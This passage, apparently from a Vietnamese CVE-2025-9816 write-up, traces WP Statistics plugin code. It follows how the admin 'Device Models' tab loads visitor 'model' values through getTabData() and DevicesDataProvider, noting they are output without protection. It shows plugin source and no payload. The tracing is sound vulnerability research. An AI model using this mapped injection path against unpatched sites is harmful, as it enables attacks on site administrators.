</span></span><span class="line"><span class="cl">      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;o-wrap o-wrap--no-data wps-center&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="cp">&lt;?php esc_html_e(&#39;No recent data available.&#39;, &#39;wp-statistics&#39;); ?&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="cp">&lt;?php endif; ?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Nếu <code>$data</code> không rỗng thì duyệt qua <code>$data</code> và hiển thị dữ liệu đã thống kê của <strong>visitors</strong>, bao gồm <code>model</code>.
Nếu rỗng thì in ra <code>No recent data available.</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">isUnknown</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="k">or</span> <span class="nv">$value</span> <span class="o">==</span> <span class="s1">&#39;Unknown&#39;</span> <span class="k">or</span> <span class="nv">$value</span> <span class="o">==</span> <span class="nx">__</span><span class="p">(</span><span class="s2">&#34;Unknown&#34;</span><span class="p">,</span> <span class="s1">&#39;wp-statistics&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">unknownToNotSet</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">isUnknown</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">__</span><span class="p">(</span><span class="s1">&#39;(not set)&#39;</span><span class="p">,</span> <span class="s1">&#39;wp-statistics&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>unknownToNotSet()</code> sẽ trả về <code>(not set)</code> nếu <code>$item-&gt;model</code> rỗng, <code>Unknown</code>, <code>Unknown</code> theo từng ngôn ngữ.</p>
<p><code>__(&quot;Unknown&quot;, 'wp-statistics')</code> sẽ tìm bản dịch của <code>Unknown</code> trong file dịch <code>.po</code>/<code>.mo</code> của text domain <code>wp-statistics</code></p>
<p>👉 Không có cơ chế bảo vệ <code>$item-&gt;model</code></p>
<p><code>$data</code> không được khởi tạo trong file này nên chắc chắn rắng nó được khởi tạo từ nơi khác và <code>models.php</code>{: .filepath} sẽ sử dụng nó khi được include.
Ta có thể search bằng từ khóa <code>models.php</code> để tìm đến nơi gọi đến nó, nhưng ở đây nó được <strong>include</strong> động. Thay vào đó, ta search với tên thư mục chứa nó <code>pages/devices</code>.</p>
<figure><img src="/posts/2025-10-08-cve-2025-9816/search1.png"
    alt="Diff — Cách các template được gọi động"><figcaption>
      <p>Diff — Cách các template được gọi động</p>
    </figcaption>
</figure>

<p>👉 <code>models.php</code>{: .filepath} sẽ được gọi động trong hàm <code>render()</code> của class <code>TabsView</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">TabsView</span> <span class="k">extends</span> <span class="nx">BaseTabView</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">render</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$currentTab</span>  <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getCurrentTab</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$data</span>        <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getTabData</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$args</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;title&#39;</span>           <span class="o">=&gt;</span> <span class="nx">esc_html__</span><span class="p">(</span><span class="s1">&#39;Devices&#39;</span><span class="p">,</span> <span class="s1">&#39;wp-statistics&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;pageName&#39;</span>        <span class="o">=&gt;</span> <span class="nx">Menus</span><span class="o">::</span><span class="na">get_page_slug</span><span class="p">(</span><span class="s1">&#39;devices&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;paged&#39;</span>           <span class="o">=&gt;</span> <span class="nx">Admin_Template</span><span class="o">::</span><span class="na">getCurrentPaged</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;custom_get&#39;</span>      <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">&#39;tab&#39;</span> <span class="o">=&gt;</span> <span class="nv">$currentTab</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;data&#39;</span>            <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;viewMoreUrlArgs&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">&#39;type&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;single-&#39;</span> <span class="o">.</span> <span class="nx">rtrim</span><span class="p">(</span><span class="nv">$currentTab</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">),</span> <span class="s1">&#39;from&#39;</span> <span class="o">=&gt;</span> <span class="nx">Request</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;from&#39;</span><span class="p">),</span> <span class="s1">&#39;to&#39;</span> <span class="o">=&gt;</span> <span class="nx">Request</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;to&#39;</span><span class="p">)],</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;tabs&#39;</span>            <span class="o">=&gt;</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="p">[</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;link&#39;</span>        <span class="o">=&gt;</span> <span class="nx">Menus</span><span class="o">::</span><span class="na">admin_url</span><span class="p">(</span><span class="s1">&#39;devices&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;tab&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;overview&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;title&#39;</span>       <span class="o">=&gt;</span> <span class="nx">esc_html__</span><span class="p">(</span><span class="s1">&#39;Overview&#39;</span><span class="p">,</span> <span class="s1">&#39;wp-statistics&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="p">[</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;link&#39;</span>        <span class="o">=&gt;</span> <span class="nx">Menus</span><span class="o">::</span><span class="na">admin_url</span><span class="p">(</span><span class="s1">&#39;devices&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;tab&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;browsers&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;title&#39;</span>       <span class="o">=&gt;</span> <span class="nx">esc_html__</span><span class="p">(</span><span class="s1">&#39;Browsers&#39;</span><span class="p">,</span> <span class="s1">&#39;wp-statistics&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="p">[</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;link&#39;</span>        <span class="o">=&gt;</span> <span class="nx">Menus</span><span class="o">::</span><span class="na">admin_url</span><span class="p">(</span><span class="s1">&#39;devices&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;tab&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;platforms&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;title&#39;</span>       <span class="o">=&gt;</span> <span class="nx">esc_html__</span><span class="p">(</span><span class="s1">&#39;Operating Systems&#39;</span><span class="p">,</span> <span class="s1">&#39;wp-statistics&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="p">[</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;link&#39;</span>        <span class="o">=&gt;</span> <span class="nx">Menus</span><span class="o">::</span><span class="na">admin_url</span><span class="p">(</span><span class="s1">&#39;devices&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;tab&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;models&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;title&#39;</span>       <span class="o">=&gt;</span> <span class="nx">esc_html__</span><span class="p">(</span><span class="s1">&#39;Device Models&#39;</span><span class="p">,</span> <span class="s1">&#39;wp-statistics&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="p">[</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;link&#39;</span>        <span class="o">=&gt;</span> <span class="nx">Menus</span><span class="o">::</span><span class="na">admin_url</span><span class="p">(</span><span class="s1">&#39;devices&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;tab&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;categories&#39;</span><span class="p">]),</span>
</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;title&#39;</span>       <span class="o">=&gt;</span> <span class="nx">esc_html__</span><span class="p">(</span><span class="s1">&#39;Device Categories&#39;</span><span class="p">,</span> <span class="s1">&#39;wp-statistics&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">Admin_Template</span><span class="o">::</span><span class="na">get_template</span><span class="p">([</span><span class="s1">&#39;layout/header&#39;</span><span class="p">,</span> <span class="s1">&#39;layout/tabbed-page-header&#39;</span><span class="p">,</span> <span class="s2">&#34;pages/devices/</span><span class="si">$currentTab</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;layout/postbox.hide&#39;</span><span class="p">,</span> <span class="s1">&#39;layout/footer&#39;</span><span class="p">],</span> <span class="nv">$args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Có sự tương quan giữa các giá trị trong <code>$args</code> và submenu <strong>Devices</strong></p>
<figure><img src="/posts/2025-10-08-cve-2025-9816/submenu.png"
    alt="Diff — Sự tương quan giữa các giá trị trong $args và submenu Devices"><figcaption>
      <p>Diff — Sự tương quan giữa các giá trị trong $args và submenu Devices</p>
    </figcaption>
</figure>

<p>Giá trị <code>tab</code> trong <code>args</code> sẽ tương ứng với param <code>tab</code> trên URL =&gt; Phạm vi truy vết nằm trong submenu <strong>Devices</strong> của admin panel. Ta cần xác định <code>$currentTab</code> để biết cách <code>render()</code> gọi đến <code>models.php</code>{: .filepath} và <code>$data</code> để inject payload.</p>
<p><strong>Biến $currentTab</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// $currentTab  = $this-&gt;getCurrentTab();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">protected</span> <span class="k">function</span> <span class="nf">getCurrentTab</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">Request</span><span class="o">::</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;tab&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">defaultTab</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>getCurrentTab()</code> trả về giá trị của <code>Request::get()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// $param=&#39;tab&#39;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$param</span><span class="p">,</span> <span class="nv">$default</span> <span class="o">=</span> <span class="k">false</span><span class="p">,</span> <span class="nv">$return</span> <span class="o">=</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$param</span><span class="p">]))</span> <span class="k">return</span> <span class="nv">$default</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$param</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$return</span> <span class="o">===</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$return</span> <span class="o">===</span> <span class="s1">&#39;url&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">sanitize_url</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$return</span> <span class="o">===</span> <span class="s1">&#39;number&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$return</span> <span class="o">===</span> <span class="s1">&#39;text&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">sanitize_textarea_field</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$return</span> <span class="o">===</span> <span class="s1">&#39;bool&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">boolval</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$return</span> <span class="o">===</span> <span class="s1">&#39;array&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">array_map</span><span class="p">(</span><span class="s1">&#39;sanitize_text_field&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>👉 <code>get()</code> trả về giá trị của param <code>'tab'</code> được lấy từ <code>$_REQUEST['tab']</code>, ví dụ:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wp-admin/admin.php?page=wps_devices_page&amp;tab=models &lt;-- $value=models</span></span></code></pre></td></tr></table>
</div>
</div><p>👉 <code>$currentTab</code> là giá trị của param <code>tab</code></p>
<p><strong>Biến $data</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// $data = $this-&gt;getTabData();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">protected</span> <span class="k">function</span> <span class="nf">getTabData</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$currentTab</span>     <span class="o">=</span> <span class="nx">ucwords</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getCurrentTab</span><span class="p">(),</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$tabDataMethod</span>  <span class="o">=</span> <span class="s1">&#39;get&#39;</span> <span class="o">.</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$currentTab</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;Data&#39;</span><span class="p">;</span> <span class="c1">// getModelsData
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">method_exists</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$tabDataMethod</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Filter to add data for locked tab
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">apply_filters</span><span class="p">(</span><span class="s2">&#34;wp_statistics_</span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getCurrentPage</span><span class="p">()</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getCurrentTab</span><span class="p">()</span><span class="si">}</span><span class="s2">_data&#34;</span><span class="p">,</span> <span class="p">[]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$tabDataMethod</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Hàm <code>getTabData()</code> được định nghĩa trong abstract class <code>BaseTabView</code>, được class <code>TabsView</code> kế thừa nên <code>$data = $this-&gt;getTabData();</code> là cách <code>TabsView</code> gọi hàm thừa hưởng từ <code>BaseTabView</code></p>
<p>Ta đang focus vào <strong>model</strong> nên tab ở đây là <code>models</code>, <code>$tabDataMethod</code> sẽ có giá trị <code>'getModelsData'</code></p>
<p>Nếu <code>getModelsData()</code> không tồn tại thì filter hook <code>wp_statistics_wps_devices_page_models_data</code> được áp dụng. Nhưng ở đây <code>getModelsData()</code> được định nghĩa trong class <code>TabsView</code>, <code>$this</code> cũng chính là <code>TabsView</code> nên <code>getModelsData()</code> của <code>TabsView</code> được gọi.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">parent</span><span class="o">::</span><span class="na">__construct</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dataProvider</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DevicesDataProvider</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;per_page&#39;</span> <span class="o">=&gt;</span> <span class="mi">10</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;page&#39;</span>     <span class="o">=&gt;</span> <span class="nx">Admin_Template</span><span class="o">::</span><span class="na">getCurrentPaged</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getModelsData</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">dataProvider</span><span class="o">-&gt;</span><span class="na">getModelsData</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>getModelsData()</code> trả về kết quả của <code>getModelsData()</code> trong class <code>DevicesDataProvider</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span> <span class="o">=</span> <span class="nv">$args</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visitorsModel</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VisitorsModel</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getModelsData</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$args</span> <span class="o">=</span> <span class="nx">array_merge</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args</span><span class="p">,</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;field&#39;</span>    <span class="o">=&gt;</span> <span class="s1">&#39;model&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;group_by&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s1">&#39;model&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">]);</span>
</span></span><span class="line"><span class="cl">
